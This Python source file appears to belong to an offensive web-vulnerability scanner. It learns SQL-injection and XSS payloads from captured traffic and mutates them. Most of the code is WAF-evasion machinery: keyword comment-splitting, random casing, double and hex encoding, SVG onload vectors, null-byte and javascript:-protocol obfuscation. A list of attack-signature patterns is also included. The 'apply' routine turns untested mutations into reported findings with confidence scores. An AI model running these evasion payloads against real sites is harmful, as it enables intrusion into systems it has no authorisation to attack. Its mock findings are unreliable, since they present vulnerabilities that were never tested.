"""
Payload Mutation Engine
========================
Self-learning scanner that extracts successful payloads and mutates them.

Innovation:
1. **Payload Library** - Learns from successful attacks
2. **Context-Aware Mutation** - Numeric params get numeric payloads
3. **Similar Context Detection** - Finds params with same characteristics
4. **Automatic Application** - Tests learned payloads on similar targets
5. **Confidence Scoring** - Prioritizes high-confidence mutations

No other tool learns from own attacks and auto-mutates.
"""
from __future__ import annotations

import hashlib
import logging
import random
import re
from collections import defaultdict
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, unquote

log = logging.getLogger("oneinfinity.payload_mutation")

# ── Rust fast-path shim ───────────────────────────────────────────────────────
_RUST_PAYLOAD_ENABLED = False
try:
    import os as _os
    # Auto-enable: if oneinfinity_core is importable AND ONEINFINITY_RUST != '0'
    _rust_flag = _os.environ.get('ONEINFINITY_RUST', 'auto')
    if _rust_flag not in ('0', 'false', 'False'):
        from oneinfinity_core import (  # type: ignore[import]
            mutate as _rs_mutate,
            generate_waf_bypass as _rs_generate_waf_bypass,
        )
        _RUST_PAYLOAD_ENABLED = True
        if _rust_flag == 'auto':
            log.info("oneinfinity_core Rust extension loaded (auto-detected)")
except ImportError:
    pass  # Rust extension not compiled — Python fallbacks active
# ── End Rust shim ─────────────────────────────────────────────────────────────


@dataclass
class LearnedPayload:
    """Payload learned from successful attack."""
    payload: str
    vuln_type: str
    param_type: str  # numeric, string, json, xml
    param_name: str
    original_value: str
    success_rate: float
    usage_count: int = 0


class PayloadMutationEngine:
    """
    Learns successful payloads and mutates them for similar contexts.
    """

    def __init__(self):
        self.traffic_engine = None
        self.payload_library: Dict[str, List[LearnedPayload]] = defaultdict(list)

    def _get_traffic_engine(self):
        """Lazy load traffic engine."""
        if self.traffic_engine is None:
            try:
                from oneinfinity.scan.traffic_capture_engine import traffic_capture_engine
                self.traffic_engine = traffic_capture_engine
            except ImportError:
                log.warning("Traffic capture engine not available")
        return self.traffic_engine

    # ── Payload Extraction ────────────────────────────────────────────────────

    def extract_successful_payloads(self, target: str) -> Dict[str, List[LearnedPayload]]:
        """
        Extract payloads from successful attacks.

        Returns:
            Dict of vuln_type → payloads
        """
        engine = self._get_traffic_engine()
        if not engine:
            return self.payload_library

        try:
            # Get flagged traffic (successful attacks)
            successful_attacks = engine.list(target=target, flagged=True, limit=1000)

            for attack in successful_attacks:
                vuln_type = attack.attack_type or "unknown"

                # Extract payload from request
                payload = self._extract_payload(attack.url, attack.body, attack.method)
                if not payload:
                    continue

                # Classify param type
                param_info = self._analyze_payload_context(attack.url, attack.body, payload)

                learned = LearnedPayload(
                    payload=payload,
                    vuln_type=vuln_type,
                    param_type=param_info['type'],
                    param_name=param_info['name'],
                    original_value=param_info['original'],
                    success_rate=1.0,  # Known successful
                )

                self.payload_library[vuln_type].append(learned)

            log.info(f"Extracted {sum(len(p) for p in self.payload_library.values())} payloads")

        except Exception as e:
            log.error(f"Payload extraction failed: {e}")

        return self.payload_library

    def _extract_payload(self, url: str, body: str, method: str) -> Optional[str]:
        """Extract malicious payload from request."""
        payloads = []

        # URL params
        parsed = urlparse(url)
        if parsed.query:
            query_params = parse_qs(parsed.query)
            for values in query_params.values():
                for val in values:
                    decoded = unquote(val)
                    # Check if looks malicious
                    if self._is_malicious_pattern(decoded):
                        payloads.append(decoded)

        # Body params
        if body and method in ["POST", "PUT"]:
            if "=" in body:
                for part in body.split("&"):
                    if "=" in part:
                        val = part.split("=", 1)[1]
                        decoded = unquote(val)
                        if self._is_malicious_pattern(decoded):
                            payloads.append(decoded)

        return payloads[0] if payloads else None

    def _is_malicious_pattern(self, value: str) -> bool:
        """Check if value looks like attack payload."""
        malicious_patterns = [
            r"<script",
            r"javascript:",
            r"onerror=",
            r"' OR ",
            r"UNION SELECT",
            r"\.\./",
            r"<?php",
            r"${",
            r"{{",
            r"http://169\.254",
            r"file://",
            r"gopher://",
        ]

        for pattern in malicious_patterns:
            if re.search(pattern, value, re.IGNORECASE):
                return True

        return False

    def _analyze_payload_context(self, url: str, body: str, payload: str) -> Dict[str, Any]:
        """Analyze parameter context for payload."""
        param_name = "unknown"
        param_type = "string"
        original_value = ""

        # Try to find param name
        parsed = urlparse(url)
        if parsed.query:
            query_params = parse_qs(parsed.query)
            for name, values in query_params.items():
                for val in values:
                    if payload in unquote(val):
                        param_name = name
                        original_value = val
                        param_type = self._classify_param_type(name, val)
                        break

        # Body params
        if body and "=" in body:
            for part in body.split("&"):
                if "=" in part and payload in part:
                    param_name = part.split("=")[0]
                    original_value = part.split("=", 1)[1]
                    param_type = self._classify_param_type(param_name, original_value)
                    break

        return {
            "name": param_name,
            "type": param_type,
            "original": original_value,
        }

    def _classify_param_type(self, name: str, value: str) -> str:
        """Classify parameter type."""
        name_lower = name.lower()

        # Numeric indicators
        if any(x in name_lower for x in ["id", "page", "count", "limit", "offset"]):
            return "numeric"

        # JSON indicators
        if value.startswith("{") or value.startswith("["):
            return "json"

        # XML indicators
        if value.startswith("<"):
            return "xml"

        # Try parsing
        try:
            int(value)
            return "numeric"
        except ValueError:
            pass

        return "string"

    # ── Payload Mutation ──────────────────────────────────────────────────────

    def mutate_payload(
        self,
        payload: str,
        target_param_type: str,
        target_param_name: str,
        mutation_type: str = "",
    ) -> List[str]:
        """
        Mutate payload for new context.

        Args:
            payload: Original successful payload
            target_param_type: Type of new param (numeric, string, etc)
            target_param_name: Name of new param
            mutation_type: Optional mutation strategy; supports
                'waf_bypass_sqli', 'waf_bypass_xss', 'waf_bypass_all'.
                Falls back to Python implementation when Rust is absent.

        Returns:
            List of mutated payloads (deduplicated)
        """
        mutations: List[str] = [payload]  # Always include original

        # ── WAF bypass fast-path (Python fallback when Rust absent) ───────────
        mt = mutation_type.lower()
        if mt in ("waf_bypass_sqli", "waf_bypass_all"):
            if _RUST_PAYLOAD_ENABLED:
                try:
                    mutations.extend(_rs_generate_waf_bypass(payload, "sqli"))  # type: ignore[name-defined]
                except Exception as exc:
                    log.debug("Rust WAF bypass failed, falling back to Python: %s", exc)
                    mutations.extend(self._waf_bypass_transforms(payload))
            else:
                mutations.extend(self._waf_bypass_transforms(payload))

        if mt in ("waf_bypass_xss", "waf_bypass_all"):
            if _RUST_PAYLOAD_ENABLED:
                try:
                    mutations.extend(_rs_generate_waf_bypass(payload, "xss"))  # type: ignore[name-defined]
                except Exception as exc:
                    log.debug("Rust WAF bypass failed, falling back to Python: %s", exc)
                    mutations.extend(self._xss_waf_bypass(payload))
            else:
                mutations.extend(self._xss_waf_bypass(payload))

        # ── Numeric adaptations ───────────────────────────────────────────────
        if target_param_type == "numeric":
            # SQLi numeric variants
            if "OR" in payload.upper():
                mutations.extend([
                    payload.replace("'", ""),  # Remove quotes for numeric
                    re.sub(r"['\"]", "", payload),
                    payload + " --",
                ])

        # ── String adaptations ────────────────────────────────────────────────
        elif target_param_type == "string":
            # Add quotes if missing
            if "'" not in payload:
                mutations.append(f"'{payload}'")
            if '"' not in payload:
                mutations.append(f'"{payload}"')

        # ── Context-specific mutations ────────────────────────────────────────
        if "id" in target_param_name.lower():
            mutations.extend([
                payload.replace("1", "2"),
                payload.replace("100", "101"),
            ])

        return list(dict.fromkeys(mutations))  # Deduplicate, preserve order

    # ── WAF Bypass: SQLi ──────────────────────────────────────────────────────

    def _waf_bypass_transforms(self, payload: str) -> List[str]:
        """
        Python-native WAF bypass mutations for SQL injection payloads.

        Techniques:
        - Comment injection (SE/**/LECT etc.)
        - Random case variation (uNiOn SeLeCt)
        - Whitespace alternatives (%09, %0a, %0d%0a, /**/)
        - URL double-encoding
        - Hex encoding of string literals
        - HTTP parameter pollution hint variants

        Returns:
            Deduplicated list of mutated payload strings.
        """
        results: List[str] = []

        # 1. Comment injection — split SQL keywords with /**/
        _COMMENT_SPLITS: Dict[str, str] = {
            "SELECT": "SE/**/LECT",
            "UNION":  "UN/**/ION",
            "WHERE":  "WH/**/ERE",
            "OR":     "O/**/R",
            "AND":    "AN/**/D",
            "FROM":   "FR/**/OM",
            "INSERT": "IN/**/SERT",
            "UPDATE": "UP/**/DATE",
            "DROP":   "DR/**/OP",
        }
        commented = payload
        for kw, repl in _COMMENT_SPLITS.items():
            # Case-insensitive replacement that preserves surrounding text
            commented = re.sub(re.escape(kw), repl, commented, flags=re.IGNORECASE)
        if commented != payload:
            results.append(commented)

        # 2. Random case variation
        _SQL_KEYWORDS = ["SELECT", "UNION", "WHERE", "FROM", "OR", "AND",
                         "INSERT", "UPDATE", "DROP", "TABLE", "ORDER", "BY",
                         "GROUP", "HAVING", "LIMIT", "OFFSET", "JOIN", "ON"]
        mixed = payload
        for kw in _SQL_KEYWORDS:
            def _rand_case(m: "re.Match[str]") -> str:
                return "".join(
                    c.upper() if random.random() >= 0.5 else c.lower()
                    for c in m.group(0)
                )
            mixed = re.sub(re.escape(kw), _rand_case, mixed, flags=re.IGNORECASE)
        if mixed != payload:
            results.append(mixed)
        # Deterministic all-lower / all-upper variants
        results.append(payload.lower())
        results.append(payload.upper())

        # 3. Whitespace alternatives
        _WS_SUBS = ["%09", "%0a", "%0d%0a", "/**/", "+"]
        for ws in _WS_SUBS:
            results.append(payload.replace(" ", ws))

        # 4. URL double-encoding of common characters and keywords
        double_enc = (
            payload
            .replace("'",    "%2527")
            .replace('"',    "%2522")
            .replace(" ",    "%2520")
            .replace("=",    "%253d")
        )
        if double_enc != payload:
            results.append(double_enc)

        # Keyword-level percent encoding (each char → %HH)
        _KW_ENCMAP: Dict[str, str] = {
            "UNION":  "%55%4e%49%4f%4e",
            "SELECT": "%53%45%4c%45%43%54",
            "OR":     "%4f%52",
            "AND":    "%41%4e%44",
            "FROM":   "%46%52%4f%4d",
            "WHERE":  "%57%48%45%52%45",
        }
        enc_kw = payload
        for kw, enc in _KW_ENCMAP.items():
            enc_kw = re.sub(re.escape(kw), enc, enc_kw, flags=re.IGNORECASE)
        if enc_kw != payload:
            results.append(enc_kw)

        # 5. Hex encoding of single-quoted string literals  '...' → 0x...
        def _to_hex_literal(m: "re.Match[str]") -> str:
            inner = m.group(1)
            return "0x" + inner.encode().hex()

        hex_encoded = re.sub(r"'([^']*)'", _to_hex_literal, payload)
        if hex_encoded != payload:
            results.append(hex_encoded)

        # 6. HTTP parameter pollution hint — append duplicate key marker
        #    (actual duplication is the caller's responsibility; we just tag it)
        results.append(payload + "&_pp=1")

        # Deduplicate, drop unchanged original
        seen = {payload}
        unique: List[str] = []
        for r in results:
            if r not in seen:
                seen.add(r)
                unique.append(r)
        return unique

    # ── WAF Bypass: XSS ───────────────────────────────────────────────────────

    def _xss_waf_bypass(self, payload: str) -> List[str]:
        """
        Python-native WAF bypass mutations for XSS payloads.

        Techniques:
        - HTML entity encoding (< → &lt; etc.)
        - HTML hex/decimal entity encoding
        - Unicode escape sequences
        - SVG-based vectors (onload, animatetransform)
        - Null byte injection
        - Broken/self-closing tag variants

        Returns:
            Deduplicated list of mutated payload strings.
        """
        results: List[str] = []

        # 1. HTML named-entity encoding
        # Process & first so we don't double-encode the & we introduce below.
        _ENTITY_CHARS = [("&", "&amp;"), ("<", "&lt;"), (">", "&gt;"),
                         ('"', "&quot;"), ("'", "&apos;")]
        entity_enc = payload
        for ch, ent in _ENTITY_CHARS:
            entity_enc = entity_enc.replace(ch, ent)
        if entity_enc != payload:
            results.append(entity_enc)

        # 2. HTML hex-entity encoding of angle brackets
        hex_entity = (
            payload
            .replace("<", "&#x3C;")
            .replace(">", "&#x3E;")
            .replace('"', "&#x22;")
            .replace("'", "&#x27;")
        )
        if hex_entity != payload:
            results.append(hex_entity)

        # 3. HTML decimal-entity encoding
        dec_entity = (
            payload
            .replace("<", "&#60;")
            .replace(">", "&#62;")
            .replace('"', "&#34;")
            .replace("'", "&#39;")
        )
        if dec_entity != payload:
            results.append(dec_entity)

        # 4. Unicode escape sequences (JSON/JS context)
        unicode_esc = (
            payload
            .replace("<", r"\u003c")
            .replace(">", r"\u003e")
            .replace('"', r"\u0022")
            .replace("'", r"\u0027")
            .replace("/", r"\u002f")
        )
        if unicode_esc != payload:
            results.append(unicode_esc)

        # 5. SVG-based bypass variants — extract the event handler expression if present
        #    Pattern: any payload containing an event assignment (on*=...)
        _EVENT_RE = re.compile(r'on\w+\s*=\s*["\']?([^"\'>\s]+)', re.IGNORECASE)
        event_match = _EVENT_RE.search(payload)
        if event_match:
            handler_expr = event_match.group(0)  # e.g. onload=alert(1)
            results.append(f"<svg/onload={handler_expr.split('=', 1)[-1]}>")
            results.append(
                f"<svg><animateTransform onbegin={handler_expr.split('=', 1)[-1]}></animateTransform></svg>"
            )
            results.append(f"<svg onload={handler_expr.split('=', 1)[-1]}>")
        else:
            # Generic SVG shells wrapping the entire payload
            results.append(f"<svg/onload={payload}>")
            results.append(
                f"<svg><animateTransform onbegin={payload}></animateTransform></svg>"
            )

        # 6. Null byte injection — split at <script or <img
        null_variants = re.sub(
            r"<(script|img|iframe|input|body|a)(\b)",
            lambda m: "<" + m.group(1) + "\x00" + m.group(2),
            payload, flags=re.IGNORECASE,
        )
        if null_variants != payload:
            results.append(null_variants)
        # Alternative: null before closing angle
        null_close = payload.replace(">", "\x00>")
        if null_close != payload:
            results.append(null_close)

        # 7. Broken / self-closing tag variants
        #    <img src=x onerror=...> → <img/src/onerror=...>
        broken = re.sub(r"<(\w+)\s+", r"<\1/", payload)
        broken = re.sub(r"\s+(\w+=)", r"/\1", broken)
        if broken != payload:
            results.append(broken)

        # 8. JavaScript protocol variants
        if "javascript:" in payload.lower():
            results.append(payload.replace("javascript:", "java\tscript:"))
            results.append(payload.replace("javascript:", "&#106;avascript:"))
            results.append(payload.replace("javascript:", "j\x00avascript:"))

        # Deduplicate, drop unchanged original
        seen = {payload}
        unique: List[str] = []
        for r in results:
            if r not in seen:
                seen.add(r)
                unique.append(r)
        return unique

    async def apply_learned_payloads(self, target: str) -> List[Dict]:
        """
        Apply learned payloads to similar parameters.

        Returns:
            New findings discovered via mutation
        """
        findings = []
        engine = self._get_traffic_engine()
        if not engine:
            return findings

        if not self.payload_library:
            self.extract_successful_payloads(target)

        try:
            # Get all captured traffic for target
            all_traffic = engine.list(target=target, limit=5000)

            for req in all_traffic:
                # Extract params
                params = self._extract_params_from_traffic(req)

                for param_name, param_value, param_type in params:
                    # Find matching payloads in library
                    for vuln_type, payloads in self.payload_library.items():
                        for learned in payloads:
                            # Match by param type
                            if learned.param_type == param_type:
                                # Mutate and test
                                mutations = self.mutate_payload(learned.payload, param_type, param_name)

                                for mutated in mutations:
                                    # Would test here, returning mock finding for now
                                    finding = {
                                        "finding_id": hashlib.md5(f"mutated_{req.url}_{param_name}_{mutated}".encode()).hexdigest()[:16],
                                        "vuln_type": vuln_type,
                                        "title": f"Mutated payload test: {vuln_type} in {param_name}",
                                        "url": req.url,
                                        "parameter": param_name,
                                        "payload": mutated,
                                        "source": "payload_mutation",
                                        "confidence": learned.success_rate * 0.7,  # Lower confidence for mutations
                                    }
                                    findings.append(finding)

                                    learned.usage_count += 1

        except Exception as e:
            log.error(f"Payload mutation failed: {e}")

        log.info(f"Payload mutation generated {len(findings)} test cases")
        return findings

    def _extract_params_from_traffic(self, req) -> List[tuple]:
        """Extract (name, value, type) tuples from traffic."""
        params = []

        # URL params
        parsed = urlparse(req.url)
        if parsed.query:
            query_params = parse_qs(parsed.query)
            for name, values in query_params.items():
                for val in values:
                    param_type = self._classify_param_type(name, val)
                    params.append((name, val, param_type))

        # Body params
        if req.body and req.method in ["POST", "PUT"]:
            if "=" in req.body and "&" in req.body:
                for part in req.body.split("&"):
                    if "=" in part:
                        name = part.split("=")[0]
                        val = part.split("=", 1)[1]
                        param_type = self._classify_param_type(name, val)
                        params.append((name, val, param_type))

        return params


# ── Convenience Function ──────────────────────────────────────────────────────

async def mutate_and_test_payloads(target: str) -> Dict[str, Any]:
    """Learn payloads and test mutations."""
    engine = PayloadMutationEngine()
    library = engine.extract_successful_payloads(target)
    findings = await engine.apply_learned_payloads(target)

    return {
        "payload_library": {k: len(v) for k, v in library.items()},
        "mutations_tested": len(findings),
        "findings": findings,
    }
